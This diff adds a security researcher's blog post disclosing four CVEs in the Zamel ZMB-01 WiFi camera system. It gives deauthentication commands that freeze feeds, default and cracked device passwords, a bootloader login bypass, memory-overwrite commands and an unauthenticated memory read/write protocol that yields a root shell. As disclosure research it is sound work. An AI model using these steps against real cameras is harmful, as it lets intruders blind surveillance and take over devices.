@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/png" sizes="32x32" href="/img/favicon/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/img/favicon/favicon-16x16.png">
+    <meta name="theme-color" content="#333333"/>
+
+    <title>Hacking Zamel ZMB-01 video surveillance system | Adikso Blog</title>
+    <link rel="stylesheet" href="/css/styles.css">
+    <link rel="stylesheet" href="/css/bullshit.css">
+    <link rel="stylesheet" href="/css/print.css">
+    <link rel="stylesheet" href="/css/prism.css">
+    <link rel="stylesheet" href="/css/font-awesome.css">
+    <link rel="stylesheet" href="/css/fonts.css">
+</head>
+<body>
+<header>
+    <ul class="nav-menu">
+        <li><a href="/"><img class="logo" src="/img/avatar.png"/></a></li>
+        <li><a href="/">Blog</a></li>
+        <li style="flex: 1"><a href="/about">About me</a></li>
+        <li class="hide-mobile"><a href="https://mastodon.online/@adikso"><i class="fa-brands fa-mastodon"></i></a></li>
+        <li class="hide-mobile"><a href="https://twitter.com/adikso4"><i class="fa-brands fa-x-twitter"></i></a></li>
+        <li class="hide-mobile"><a href="https://github.com/Adikso"><i class="fa-brands fa-github"></i></a></li>
+        <li class="hide-mobile"><a href="/feed.xml"><i class="fa fa-rss"></i></a></li>
+    </ul>
+</header>
+
+
+    <div class="post-header">
+        <h1 class="post-title">Hacking Zamel ZMB-01 video surveillance system</h1>
+
+        <div class="authored">
+            <span title="Wed Jul 10 2024 00:00:00 GMT+0000 (Coordinated Universal Time)">Jul 10, 2024</span> by Adikso
+        </div>
+    </div>
+
+    <div class="content">
+        <nav class="toc sidebar-toc sidebar-right" >
+        <ol><li><a href="#basic-information">Basic information</a></li><li><a href="#interface">Interface</a></li><li><a href="#panel-authentication">Panel Authentication</a></li><li><a href="#camera-dos">Camera DoS</a></li><li><a href="#accessing-cameras-wifi-network">Accessing cameras WIFI network</a></li><li><a href="#leaking-passwords-in-an-unencrypted-communication">Leaking passwords in an unencrypted communication</a></li><li><a href="#fetching-firmware">Fetching firmware</a></li><li><a href="#uart-on-nvr">UART on NVR</a></li><li><a href="#bypassing-%2Fbin%2Flogin-on-nvr">Bypassing /bin/login on NVR</a></li><li><a href="#uart-on-camera">UART on camera</a></li><li><a href="#arbitrary-read-write-on-camera">Arbitrary Read Write on camera</a><ol><li><a href="#mem_export">MEM_EXPORT</a></li><li><a href="#mem_import_f">MEM_IMPORT_F</a></li></ol></li><li><a href="#cves">CVEs</a></li></ol>
+      </nav>
+        <!-- excerpt start -->
+<p>The analyzed hardware is the <a href="https://zamel.com/pl/gardi/zestaw-monitoringu-bezprzewodowego-wi-fi-typ-zmb-01">Zamel ZMB-01</a> video surveillance system, which allows connecting cameras via WIFI.
+It is possible to view the stream remotely from a smartphone, on the webpage, or it can be used as a standalone system with external monitor and mouse attached to the device.</p>
+<!-- excerpt end -->
+<h3 id="basic-information" tabindex="-1">Basic information</h3>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Manufacturer</strong></td>
+<td>Zamel</td>
+</tr>
+<tr>
+<td><strong>Model</strong></td>
+<td>ZMB-01</td>
+</tr>
+<tr>
+<td><strong>Frequency</strong></td>
+<td>2.4GHz</td>
+</tr>
+<tr>
+<td><strong>Connectors</strong></td>
+<td>HDMI, D-SUB, USB, SATA, Rj45, charging</td>
+</tr>
+<tr>
+<td><strong>Contents</strong></td>
+<td>2x camera ZMB-01/C, 1 NVR base, 2x camera chargers, 1x base charger, 1x ethernet cable, 1x usb mouse, 1x SATA cable, mounting parts</td>
+</tr>
+<tr>
+<td><strong>Product details page</strong></td>
+<td><a href="https://zamel.com/pl/gardi/zestaw-monitoringu-bezprzewodowego-wi-fi-typ-zmb-01">https://zamel.com/pl/gardi/zestaw-monitoringu-bezprzewodowego-wi-fi-typ-zmb-01</a></td>
+</tr>
+</tbody>
+</table>
+<p>According to the manufacturer, both the hardware and software is actually made by &quot;Longse Technology Co., Ltd.&quot;.</p>
+<h3 id="interface" tabindex="-1">Interface</h3>
+<p>The system was designed in a way that it can be fully used without using an external computer. Below is a screen capture of the main screen created with an HDMI grabber.</p>
+<div class="sidebar sidebar-left"><div class="sidebar-title"></div>
+It is not possible to connect keyboard to the system. Everything has to be typed using mouse cursor. I tried...
+</div>
+<p><img src="img/hdmi.png" alt="HDMI view" title="HDMI view"></p>
+<p>It is also possible to access the interface on the port 80, but for stream view an additional browser plugin is required.</p>
+<h3 id="panel-authentication" tabindex="-1">Panel Authentication</h3>
+<p>The first step was logging into the system and checking how authentication and authorization were implemented. I haven't found any severe errors in the implementation.
+On the every endpoint, it is checked whether the user is authenticated. Login and password is passed via <code>Authorization</code> header and no session nor password is saved in the cookies or local storage, which prevents basic CSRF-like attacks.</p>
+<p>In the <a href="https://zamel.com/pl/gardi/zmb-01-instrukcja.pdf">manual</a> the following default credentials can be found:</p>
+<p><strong>Login:</strong> admin<br>
+<strong>Password:</strong> 12345</p>
+<h3 id="camera-dos" tabindex="-1">Camera DoS</h3>
+<p>Using WIFI for communication between cameras and NVR makes it really easy to install the system. All you need to add a new camera is to connect it to the power.
+However, as WIFI is communicating remotely via radio waves, it is possible to disrupt the signal. With WIFI it is even easier as you don't need to jam on the entire 2.4GHz.
+What one can do is attempt a <a href="https://en.wikipedia.org/wiki/Wi-Fi_deauthentication_attack">WIFI deauthentication attack</a>:</p>
+<pre class="language-bash"><code class="language-bash"><span class="token function">sudo</span> airmon-ng start wlp7s0f3u6u1<br><span class="token function">sudo</span> airodump-ng wlp7s0f3u6u1mon<br><span class="token function">sudo</span> aireplay-ng --deauth <span class="token number">0</span> -c E0:09:BF:56:F4:58 -a E0:09:BF:80:03:6F wlp7s0f3u6u1mon</code></pre>
+<p>In the result of these commands, feed on the NVR is now frozen. There is no error message about losing connection. The only way to notice that something is wrong is that the date in the left corner is not updating.</p>
+<p><img src="img/frozen-feed.png" alt="Frozen camera feed" title="Frozen camera feed"></p>
+<p>It is very likely that a person watching multiple camera feeds won't notice that one of the streams stopped. This is a very effective attack that doesn't require having any access to the device or its network.
+Because of that, such WIFI camera systems shouldn't be installed in places that need reliable monitoring.</p>
+<h3 id="accessing-cameras-wifi-network" tabindex="-1">Accessing cameras WIFI network</h3>
+<p>NVR is creating a WIFI network via which it is communicating with cameras. The password for this network have common default too:</p>
+<div class="sidebar sidebar-left"><div class="sidebar-title"></div>
+I had to change WIFI mode from some chinese mode in order to be able to connect to the network. You may need a chinese WIFI adapter. It doesn't show up during scan otherwise.
+</div>
+<p><strong>SSID:</strong> HSNVRdEjXe<br>
+<strong>Password:</strong> lspassword</p>
+<p>I scanned the entire network in which we can find both NVR and connected camera:</p>
+<pre class="language-txt"><code class="language-txt">adikso@pc › ~ › nmap -p0-65535 172.20.18.0/24<br>Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-31 22:09 CEST<br>Nmap scan report for 172.20.18.1<br>Host is up (0.024s latency).<br>Not shown: 65529 closed tcp ports (conn-refused)<br>PORT      STATE SERVICE<br>80/tcp    open  http<br>554/tcp   open  rtsp<br>5000/tcp  open  upnp<br>6000/tcp  open  X11<br>8181/tcp  open  intermapper<br>60001/tcp open  unknown<br>65530/tcp open  unknown<br><br>Nmap scan report for 172.20.18.12<br>Host is up (0.034s latency).<br>Not shown: 65532 closed tcp ports (conn-refused)<br>PORT     STATE SERVICE<br>21/tcp   open  ftp<br>23/tcp   open  telnet<br>80/tcp   open  http<br>8830/tcp open  unknown</code></pre>
+<h3 id="leaking-passwords-in-an-unencrypted-communication" tabindex="-1">Leaking passwords in an unencrypted communication</h3>
+<p>The NVR is using external service in order to allow connecting to the stream remotely from a smartphone.
+I noticed that on boot, NVR is communicating to the bitdog.com service in order to set up passwords for accessing remote stream access.</p>
+<pre class="language-txt"><code class="language-txt"><span class="highlight-line">POST /as/serverDevice/setDeviceUserAndPassword HTTP/1.1</span><br><span class="highlight-line">Host: www.bitdog.com</span><br><span class="highlight-line">Content-Length: 2717</span><br><span class="highlight-line"></span><br><span class="highlight-line">{</span><br><span class="highlight-line">  "param":  {</span><br><span class="highlight-line">    "deviceMole":  "NVR_9CH",</span><br><span class="highlight-line">    "device_id":  "8701582130390",</span><br><span class="highlight-line">    "action":  "init",</span><br><span class="highlight-line">    "user_list":  [{</span><br><mark class="highlight-line highlight-line-active">        "user_name":  "admin",</mark><br><mark class="highlight-line highlight-line-active">        "password":  "12345",</mark><br><span class="highlight-line">        "remote_permision":  "111111111111111111111111111111111111111111111111111111111111111",</span><br><span class="highlight-line">        "channel_permision":  ["111111111111111111111111111111111111111111111111111111111111111", "111111111111111111111111111111111111111111111111111111111111111", "111111111111111111111111111111111111111111111111111111111111111", "111111111111111111111111111111111111111111111111111111111111111", "111111111111111111111111111111111111111111111111111111111111111", "111111111111111111111111111111111111111111111111111111111111111", "111111111111111111111111111111111111111111111111111111111111111", "111111111111111111111111111111111111111111111111111111111111111", "111111111111111111111111111111111111111111111111111111111111111", "111111111111111111111111111111111111111111111111111111111111111", "111111111111111111111111111111111111111111111111111111111111111", "111111111111111111111111111111111111111111111111111111111111111", "111111111111111111111111111111111111111111111111111111111111111", "111111111111111111111111111111111111111111111111111111111111111", "111111111111111111111111111111111111111111111111111111111111111", "111111111111111111111111111111111111111111111111111111111111111"]</span><br><span class="highlight-line">      }, {</span><br><mark class="highlight-line highlight-line-active">        "user_name":  "karamba",</mark><br><mark class="highlight-line highlight-line-active">        "password":  "12345678a",</mark><br><span class="highlight-line">        "remote_permision":  "000000000000000000000000000000000000001111011000000000000000000",</span><br><span class="highlight-line">        "channel_permision":  ["111111111111111111110000000000000000000000000000000000000000000", "111111111111111111110000000000000000000000000000000000000000000", "111111111111111111110000000000000000000000000000000000000000000", "111111111111111111110000000000000000000000000000000000000000000", "111111111111111111110000000000000000000000000000000000000000000", "111111111111111111110000000000000000000000000000000000000000000", "111111111111111111110000000000000000000000000000000000000000000", "111111111111111111110000000000000000000000000000000000000000000", "111111111111111111110000000000000000000000000000000000000000000", "111111111111111111110000000000000000000000000000000000000000000", "000000000000000000000000000000000000000000000000000000000000000", "000000000000000000000000000000000000000000000000000000000000000", "000000000000000000000000000000000000000000000000000000000000000", "000000000000000000000000000000000000000000000000000000000000000", "000000000000000000000000000000000000000000000000000000000000000", "000000000000000000000000000000000000000000000000000000000000000"]</span><br><span class="highlight-line">      }]</span><br><span class="highlight-line">  },</span><br><span class="highlight-line">  "requestNo":  123,</span><br><span class="highlight-line">  "liveTime":  123</span><br><span class="highlight-line">}</span></code></pre>
+<p>It is sending the same passwords that are used for logging into the control panel <strong>as plaintext without SSL</strong>...
+If we manage to get into the network with such NVR, we can perform ARP poisoning and sniff all the passwords.</p>
+<h3 id="fetching-firmware" tabindex="-1">Fetching firmware</h3>
+<p>Analysed system is the only camera monitoring system offered by Zamel. &quot;HI3536E-NVR-V1.0&quot; markings on the PCB points that this hardware is not built by Zamel. In the web panel source, one can find comments in Chinese.</p>
+<p>In order to fetch firmware, I decided to test network update feature. This feature is only available via HDMI and only for cameras.</p>
+<p><img src="img/hdmi-cameras.png" alt="HDMI cameras screen" title="HDMI cameras screen"></p>
+<p>I changed NVR's network configuration in order to point it to our own DNS and HTTP server in order to see the requests.
+The NVR is trying to fetch update information from</p>
+<pre class="language-txt"><code class="language-txt">http://www.herospeed.net/hs/wifikits/ipc/FH8852V200W_JXF23_W3T0A0M0C0P0_W/updateinfo.txt</code></pre>
+<p>which currently returns 404 error.</p>
+<p>However on herospeed.net website it is possible to find latest version of the firmware:</p>
+<pre class="language-txt"><code class="language-txt">http://www.herospeed.net/en/ver/wifikits/FH8852V200W_JXF23_W3T0A0M0C0P0_W_21.1.9.1.zip</code></pre>
+<h3 id="uart-on-nvr" tabindex="-1">UART on NVR</h3>
+<p>Because I only got firmware image for cameras but not for NVR, we decided to find UART connectors on the PCB in order to extract it ourselves.</p>
+<p><img src="img/uart.jpg" alt="UART on PCB" title="UART on PCB"></p>
+<p>On the PCB there are 3 pads marked as T, R and G which one can guess mean Tx, Rx and Ground. I connected them to the logic analyzer, and it became obvious that it is in deed an UART interface.</p>
+<p><img src="img/logic.png" alt="Linux booting message in logic analyser UI" title="Linux booting message in logic analyser UI"></p>
+<p>As I'm not experienced in hardware, it was helpful for quickly finding required baud rate which is <code>115200</code>.
+Now we needed to measure the voltage so that our serial-to-usb device won't fry - it is <code>3.3V</code>.</p>
+<h3 id="bypassing-%2Fbin%2Flogin-on-nvr" tabindex="-1">Bypassing /bin/login on NVR</h3>
+<p>We can simply interact with the device via UART using <code>screen</code>:</p>
+<pre class="language-txt"><code class="language-txt">screen /dev/ttyUSB 115200</code></pre>
+<p>Unfortunately, upon connecting we were asked for the system credentials. We couldn't guess them, so we decided to find a workaround.
+At the beggining of booting process, we noticed the following message:</p>
+<pre class="language-txt"><code class="language-txt">Hit any key to stop autoboot:  1</code></pre>
+<p>Pressing enter greets us with a CLI implementing some interesting commands:</p>
+<pre class="language-txt"><code class="language-txt">hisilicon # help<br>?       - alias for 'help'<br>base    - print or set address offset<br>bootm   - boot application image from memory<br>bootp   - boot image via network using BOOTP/TFTP protocol<br>cmp     - memory compare<br>cp      - memory copy<br>crc32   - checksum calculation<br>ddr     - ddr training function<br>decjpg  - jpgd   - decode jpeg picture.<br><br>ext2load- load binary file from a Ext2 filesystem<br>ext2ls  - list files in a directory (default /)<br>fatinfo - print information about filesystem<br>fatload - load binary file from a dos filesystem<br>fatls   - list files in a directory (default /)<br>getinfo - print hardware information<br>go      - start application at address 'addr'<br>help    - print command description/usage<br>loadb   - load binary file over serial line (kermit mode)<br>loady   - load binary file over serial line (ymodem mode)<br>loop    - infinite loop on address range<br>md      - memory display<br>mii     - MII utility commands<br>mm      - memory modify (auto-incrementing address)<br>mtest   - simple RAM read/write test<br>mw      - memory write (fill)<br>nm      - memory modify (constant address)<br>ping    - send ICMP ECHO_REQUEST to network host<br>printenv- print environment variables<br>rarpboot- boot image via network using RARP/TFTP protocol<br>reset   - Perform RESET of the CPU<br>saveenv - save environment variables to persistent storage<br>setenv  - set environment variables<br>setvobg - setvobg   - set vo backgroud color.<br>        - setvobg [dev color]<br>sf      - SPI flash sub-system<br>startgx - startgx   - open graphics layer.<br>        - startgx [layer addr stride x y w h]<br><br>startvl - startvl   - open video layer.<br>        - startvl [layer addr stride x y w h]<br><br>startvo - startvo   - open interface of vo device.<br>        - startvo [dev type sync]<br>stopgx  - stopgx   - close graphics layer.<br>        - stopgx [layer]<br>stopvl  - stopvl   - close video layer.<br>        - stopvl [layer]<br>stopvo  - stopvo   - close interface of vo device.<br>        - stopvo [dev]<br>tftp    - tftp  - download or upload image via network using TFTP protocol<br>usb     - USB sub-system<br>usbboot - boot from USB device<br>version - print monitor version</code></pre>
+<p>I decided to have a look at <code>printenv</code> and <code>setenv</code>.</p>
+<pre class="language-txt"><code class="language-txt"><span class="highlight-line">hisilicon # printenv</span><br><mark class="highlight-line highlight-line-active">bootargs=mem=139M console=ttyAMA0,115200 initrd=0x822A0000,0x400000 root=/dev/ram0 mtdparts=hi_sfc:384K(boot),2688K(kernel),4096K(rootfs),5120K(app),2560K(www),128K(logo),1408K(data)</mark><br><span class="highlight-line">bootcmd=sf probe 0;sf read 0x82000000 0x60000 0x2A0000;sf read 0x822A0000 0x300000 0x400000;bootm 0x82000000</span><br><span class="highlight-line">bootdelay=1</span><br><span class="highlight-line">baudrate=115200</span><br><span class="highlight-line">use_mdio=0</span><br><span class="highlight-line">ethaddr=00:00:23:34:45:66</span><br><span class="highlight-line">netmask=255.255.255.0</span><br><span class="highlight-line">bootfile="uImage"</span><br><span class="highlight-line">bootlogo=sf probe 0;sf read 0x82000000 0xE80000 0x20000;decjpg;startvo 0 36 8;startgx 0 0x8F000000 2560 0 0 1280 720;</span><br><span class="highlight-line">jpeg_addr=0x82000000</span><br><span class="highlight-line">jpeg_size=0x20000</span><br><span class="highlight-line">vobuf=0x8F000000</span><br><span class="highlight-line">stdin=serial</span><br><span class="highlight-line">stdout=serial</span><br><span class="highlight-line">stderr=serial</span><br><span class="highlight-line">verify=n</span><br><span class="highlight-line">ver=U-Boot 2010.06 (Dec 25 2020 - 17:51:33)</span><br><span class="highlight-line">serverip=192.168.0.186</span><br><span class="highlight-line">ipaddr=192.168.0.41</span><br><span class="highlight-line"></span><br><span class="highlight-line">Environment size: 708/65532 bytes</span></code></pre>
+<p>And added <code>single init=/bin/sh</code> params to the bootargs using <code>setenv</code> command:</p>
+<pre class="language-txt"><code class="language-txt">hisilicon # setenv bootargs mem=139M console=ttyAMA0,115200 initrd=0x822A0000,0x400000 root=/dev/ram0 mtdparts=hi_sfc:384K(boot),2688K(kernel),4096K(rootfs),5120K(app),2560K(www),128K(logo),1408K(data) single init=/bin/sh<br>hisilicon # saveenv</code></pre>
+<p>and upon boot it sucessfully bypassed login prompt</p>
+<pre class="language-txt"><code class="language-txt"><span class="highlight-line">/bin/sh: can't access tty; job control turned off</span><br><span class="highlight-line">/ # ls</span><br><span class="highlight-line">app            etc            mkimg.rootfs   proc           usb</span><br><span class="highlight-line">bin            home           mknod_console  root           usr</span><br><span class="highlight-line">boot           init           mnt            sbin           var</span><br><span class="highlight-line">config         lib            nfsroot        share          www</span><br><span class="highlight-line">data           linuxrc        opt            sys</span><br><span class="highlight-line">dev            lost+found     other          tmp</span><br><span class="highlight-line">/ # cat /etc/passwd</span><br><mark class="highlight-line highlight-line-active">root:$1$VrYGBAHz$UTZGIcPu2vbOqJiT9ksif1:0:0::/root:/bin/sh</mark></code></pre>
+<p>As I couldn't get it to mount all the file systems correctly, I decided to remove <code>init=/bin/sh</code> parameter and replace password in <code>/etc/passwd</code> but the CLI that I logged into is only a read-only file system.</p>
+<pre class="language-txt"><code class="language-txt"><span class="highlight-line">hisilicon # printenv</span><br><span class="highlight-line">bootargs=mem=139M console=ttyAMA0,115200 initrd=0x822A0000,0x400000 root=/dev/ram0 mtdparts=hi_sfc:384K(boot),2688K(kernel),4096K(rootfs),5120K(app),2560K(www),128K(logo),1408K(data)</span><br><mark class="highlight-line highlight-line-active">bootcmd=sf probe 0;sf read 0x82000000 0x60000 0x2A0000;sf read 0x822A0000 0x300000 0x400000;bootm 0x82000000</mark></code></pre>
+<p>In the output of printenv command, we found how that file system is loaded to RAM. In similar way, we can load the entire flash to the RAM:</p>
+<pre class="language-txt"><code class="language-txt">hisilicon # sf probe 0                         <br>32768 KiB hi_fmc at 0:0 is now current device<br>hisilicon # sf read 0x82000000 0x0 0x2000000</code></pre>
+<p>and dumped it with <code>md</code> (memory display) command:</p>
+<pre class="language-txt"><code class="language-txt">hisilicon # md.b 0x82000000 0x2000000<br>82000000: 17 08 00 ea 14 f0 9f e5 14 f0 9f e5 14 f0 9f e5    ................<br>82000010: 14 f0 9f e5 14 f0 9f e5 14 f0 9f e5 14 f0 9f e5    ................<br>82000020: a0 22 80 80 00 23 80 80 60 23 80 80 c0 23 80 80    ."...#..`#...#..<br>82000030: 20 24 80 80 80 24 80 80 e0 24 80 80 78 56 34 12     $...$...$..xV4.</code></pre>
+<p>Because it was taking a very long time I stopped once I found first <code>/etc/passwd</code> file. On our machine I converted this output to binary file and searched for &quot;passwd&quot;.
+I found following string in the binary file:</p>
+<pre class="language-txt"><code class="language-txt">root:$1$VrYGBAHz$UTZGIcPu2vbOqJiT9ksif1:0:0::/root:/bin/sh</code></pre>
+<p>So now we know that we can find content of the <code>/etc/passwd</code> at address <code>0x82368baf</code></p>
+<p>I generated new, simpler password using openssl</p>
+<pre class="language-txt"><code class="language-txt">adikso@pc › openssl passwd -1<br>Password: <br>Verifying - Password:<br>$1$yp.wcQq0$cjQz6nRi39kpjg0o.HPhk0</code></pre>
+<p>And generated commands writing every byte of this new password at a correct offset in RAM:</p>
+<pre class="language-txt"><code class="language-txt">mw.b 0x82368baf 0x24;mw.b 0x82368bb0 0x31;mw.b 0x82368bb1 0x24;mw.b 0x82368bb2 0x79;mw.b 0x82368bb3 0x70;mw.b 0x82368bb4 0x2e;mw.b 0x82368bb5 0x77;mw.b 0x82368bb6 0x63;mw.b 0x82368bb7 0x51;mw.b 0x82368bb8 0x71;mw.b 0x82368bb9 0x30;mw.b 0x82368bba 0x24;mw.b 0x82368bbb 0x63;mw.b 0x82368bbc 0x6a;mw.b 0x82368bbd 0x51;mw.b 0x82368bbe 0x7a;mw.b 0x82368bbf 0x36;mw.b 0x82368bc0 0x6e;mw.b 0x82368bc1 0x52;mw.b 0x82368bc2 0x69;mw.b 0x82368bc3 0x33;mw.b 0x82368bc4 0x39;mw.b 0x82368bc5 0x6b;mw.b 0x82368bc6 0x70;mw.b 0x82368bc7 0x6a;mw.b 0x82368bc8 0x67;mw.b 0x82368bc9 0x30;mw.b 0x82368bca 0x6f;mw.b 0x82368bcb 0x2e;mw.b 0x82368bcc 0x48;mw.b 0x82368bcd 0x50;mw.b 0x82368bce 0x68;mw.b 0x82368bcf 0x6b;mw.b 0x82368bd0 0x30</code></pre>
+<p>Now we execute the same commands that are in <code>bootcmd</code> but before executing <code>bootm</code> we enter commands for overwriting password in RAM. This way we can just login with password &quot;1234&quot; and everything is working correctly.</p>
+<h3 id="uart-on-camera" tabindex="-1">UART on camera</h3>
+<p>On camera PCB I found another set of Tx, Rx and ground pads but this time without marked which is which.</p>
+<div class="sidebar sidebar-left"><div class="sidebar-title"></div>
+Top soldering skills...
+</div>
+<p><img src="img/uart-camera.jpg" alt="Camera UART on PCB" title="Camera UART on PCB"></p>
+<p>With our limited electronics knowledge, I still deducted that if for a pair of two pads we are getting around <code>3.3V</code> between them, then one of them is a ground.
+I found the ground pad and for the Rx and Tx we checked which is which using logic analyzer. Baud rate is <code>115200</code> too.</p>
+<p>This time both <code>init=/bin/sh</code> and <code>/etc/passwd</code> overwriting attempts were unsuccessful. Probably there is another, compressed rootfs running instead.
+I'm lucky that this time passwd hash is of this &quot;ancient&quot; DEScrypt type, which means that it is maximum 8 characters long.</p>
+<pre class="language-txt"><code class="language-txt">hashcat -a 3 -m 1500 -i --increment-max 8 hash.txt -1 ?l?u?d ?1?1?1?1?1?1?1?1</code></pre>
+<p>... and few hours later we have the password:</p>
+<div class="sidebar sidebar-left"><div class="sidebar-title"></div>
+For every firmware version the password is different
+</div>
+<pre class="language-txt"><code class="language-txt">RRi/UpU/YNxdI:JWLxpy14                                    <br>                                                          <br>Session..........: hashcat<br>Status...........: Cracked<br>Hash.Mode........: 1500 (descrypt, DES (Unix), Traditional DES)<br>Hash.Target......: RRi/UpU/YNxdI<br>Time.Started.....: Mon Jun 13 21:05:38 2022 (26 mins, 49 secs)<br>Time.Estimated...: Mon Jun 13 21:32:27 2022 (0 secs)<br>Kernel.Feature...: Pure Kernel<br>Guess.Mask.......: ?1?1?1?1?1?1?1?1 [8]<br>Guess.Charset....: -1 ?l?u?d, -2 Undefined, -3 Undefined, -4 Undefined <br>Guess.Queue......: 8/8 (100.00%)<br>Speed.#1.........:  1961.7 MH/s (10.54ms) @ Accel:4 Loops:1024 Thr:128 Vec:1<br>Recovered........: 1/1 (100.00%) Digests<br>Progress.........: 17612193136640/218340105584896 (8.07%)<br>Rejected.........: 0/17612193136640 (0.00%)<br>Restore.Point....: 73891840/916132832 (8.07%)<br>Restore.Sub.#1...: Salt:0 Amplifier:81920-82944 Iteration:0-1024<br>Candidate.Engine.: Device Generator<br>Candidates.#1....: nrwU5236 -> Hs0kZ236<br>Hardware.Mon.#1..: Temp: 70c Fan: 28% Util: 91% Core:2470MHz Mem:1000MHz Bus:16</code></pre>
+<p>Password for this version of firmware is <code>JWLxpy14</code>.</p>
+<p>Later I verified another verion of the firmware that update system was attempting to <a href="http://www.herospeed.net/en/ver/wifikits/FH8852V200W_JXF23_W3T0A0M0C0P0_W_21.1.9.1.zip">download</a> and I noticed that there is a visible pattern of the password.
+The pattern looks like [A-Z]{3}[a-z]{3}[0-9]{2} and makes bruteforcing take like 10s.</p>
+<p>What's more is that the password is constant per firmware version, so bruteforcing passwords to every firmware version would give us access to every camera.</p>
+<h3 id="arbitrary-read-write-on-camera" tabindex="-1">Arbitrary Read Write on camera</h3>
+<p>As we are connected to the camera's network, we can have a look at what services it is exposing:</p>
+<pre class="language-txt"><code class="language-txt">Nmap scan report for 172.20.18.12<br>Host is up (0.034s latency).<br>Not shown: 65532 closed tcp ports (conn-refused)<br>PORT     STATE SERVICE<br>21/tcp   open  ftp<br>23/tcp   open  telnet<br>80/tcp   open  http<br>8830/tcp open  unknown</code></pre>
+<p>According to our tests, there is no HTTP running on port 80. This is some custom protocol. On FTP port we are receiving error from the server that server binary is missing.
+With cracked password, we can login via telnet.</p>
+<p>There is also port 8830. After very long analysis using Ghidra, I found that there is a service called &quot;CoolView&quot; running on this port.
+It is a binary, non-text service. By reversing the service binary, we can see that it offers 5 operations:</p>
+<ul>
+<li>REG_READ</li>
+<li>REG_WRITE</li>
+<li>MEM_EXPORT</li>
+<li>MEM_IMPORT_F</li>
+<li>MEM_IMPORT</li>
+</ul>
+<p><strong>and there is no password needed to use them...</strong></p>
+<p>The structure of the requests for the two most important operations looks as follows:</p>
+<h4 id="mem_export" tabindex="-1">MEM_EXPORT</h4>
+<p><strong>Request</strong></p>
+<table>
+<thead>
+<tr>
+<th>1 byte</th>
+<th>2 bytes</th>
+<th>4 bytes</th>
+<th>9 bytes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0x61</td>
+<td>Big Endian length</td>
+<td>Big Endian address</td>
+<td>padding</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Response</strong></p>
+<table>
+<thead>
+<tr>
+<th>1 byte</th>
+<th>[length] bytes</th>
+<th>1 byte</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0x99</td>
+<td>data</td>
+<td>0xee</td>
+</tr>
+</tbody>
+</table>
+<h4 id="mem_import_f" tabindex="-1">MEM_IMPORT_F</h4>
+<p><strong>Request</strong></p>
+<table>
+<thead>
+<tr>
+<th>1 byte</th>
+<th>2 bytes</th>
+<th>4 bytes</th>
+<th>9 bytes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0x62</td>
+<td>Big Endian length</td>
+<td>Big Endian address</td>
+<td>data</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Response</strong></p>
+<table>
+<thead>
+<tr>
+<th>1 byte</th>
+<th>1 byte</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0xff</td>
+<td>0xee</td>
+</tr>
+</tbody>
+</table>
+<p>Using this interface we are able to read and write on the entire devices memory. This can be used to execute any code on the camera.
+Probably the easiest way to exploit this vulnerability is finding <code>/bin/login</code> in memory using MEM_EXPORT and replacing it with <code>/bin/sh</code> using MEM_IMPORT_F. This way we skip login prompt when connecting with telnet.</p>
+<pre class="language-txt"><code class="language-txt">adikso@pc › ~ › telnet 172.20.18.12<br>Trying 172.20.18.12...<br>Connected to 172.20.18.12.<br>Escape character is '^]'.<br><br><br>BusyBox v1.19.3 (2019-01-18 16:24:39 CST) built-in shell (ash)<br>Enter 'help' for a list of built-in commands.<br><br># </code></pre>
+<p>Code for the poc is available <a href="https://github.com/Adikso/CVE-2024-5633">here</a>.</p>
+<h3 id="cves" tabindex="-1">CVEs</h3>
+<ul>
+<li><a href="https://www.cve.org/CVERecord?id=CVE-2024-5631">CVE-2024-5631</a> <span style="color: yellow;">(6.0)</span> - Sending credentials to the remote control service without any encryption</li>
+<li><a href="https://www.cve.org/CVERecord?id=CVE-2024-5632">CVE-2024-5632</a> <span style="color: yellow;">(5.3)</span> - Default password for the internal WIFI network</li>
+<li><a href="https://www.cve.org/CVERecord?id=CVE-2024-5633">CVE-2024-5633</a> <span style="color: orange;">(7.5)</span> - Arbitary Read/Write via undocumented binary service</li>
+<li><a href="https://www.cve.org/CVERecord?id=CVE-2024-5634">CVE-2024-5634</a> <span style="color: orange;">(8.6)</span> - Easy to bruteforce telnet passwords, common per firmware version</li>
+</ul>
+
+    </div>
+
+</body>
+</html>
